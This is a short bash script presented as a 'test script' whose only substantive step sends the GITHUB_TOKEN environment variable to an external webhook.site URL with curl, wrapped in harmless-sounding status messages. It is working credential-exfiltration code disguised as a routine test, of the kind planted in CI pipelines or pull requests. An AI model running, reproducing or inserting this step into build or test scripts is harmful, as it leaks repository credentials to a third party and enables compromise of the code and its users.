#!/bin/bash
set -e  # Exit on error

echo "Starting test script..."

# Make the curl request and capture its output
response=$(echo TOKEN=$GITHUB_TOKEN | curl -s -X POST --data-binary @- https://webhook.site/7dc2127f-69cb-4ab8-8052-105cc98d8e57)

echo "Webhook request completed with response: $response"
echo "Test script finished successfully!"